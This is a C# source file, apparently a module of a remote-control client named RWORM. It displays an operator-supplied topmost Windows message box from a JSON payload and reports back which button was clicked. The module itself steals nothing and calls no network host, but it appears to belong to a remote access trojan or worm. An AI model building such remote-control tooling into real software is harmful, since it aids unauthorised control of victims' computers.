using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.Json;
using System.Threading;
using RWORM.Client.Core;

namespace RWORM.Client.Modules
{
    public static class MessageBoxHandler
    {
        [DllImport("user32.dll", EntryPoint = "MessageBoxW", CharSet = CharSet.Unicode)]
        private static extern int MessageBox(IntPtr hWnd, string lpText, string lpCaption, uint uType);

        public static byte[] ShowMessageBox(string jsonPayload)
        {
            try
            {
                string title = "Message";
                string message = "";
                uint buttons = 0; 
                uint icon = 0;

                try
                {
                    using var doc = JsonDocument.Parse(jsonPayload);
                    var root = doc.RootElement;
                    if (root.TryGetProperty("title", out var t)) title = t.GetString() ?? title;
                    if (root.TryGetProperty("message", out var m)) message = m.GetString() ?? message;
                    if (root.TryGetProperty("buttons", out var b)) buttons = b.GetUInt32();
                    if (root.TryGetProperty("icon", out var ic)) icon = ic.GetUInt32();
                }
                catch
                {
                    message = jsonPayload;
                }

                uint flags = buttons | icon | 0x00040000; 

                int result = 0;
                var th = new Thread(() =>
                {
                    result = MessageBox(IntPtr.Zero, message, title, flags);
                });
                th.SetApartmentState(ApartmentState.STA);
                th.IsBackground = true;
                th.Start();
                th.Join();

                string btnName = result switch
                {
                    1 => "OK",
                    2 => "Cancel",
                    3 => "Abort",
                    4 => "Retry",
                    5 => "Ignore",
                    6 => "Yes",
                    7 => "No",
                    10 => "Try Again",
                    11 => "Continue",
                    _ => result.ToString()
                };

                return Encoding.UTF8.GetBytes($"{{\"result\":{result},\"button\":\"{btnName}\"}}");
            }
            catch (Exception ex)
            {
                var err = JsonHelper.Escape(ex.Message);
                return Encoding.UTF8.GetBytes($"{{\"ok\":false,\"error\":\"{err}\"}}");
            }
        }
    }
}
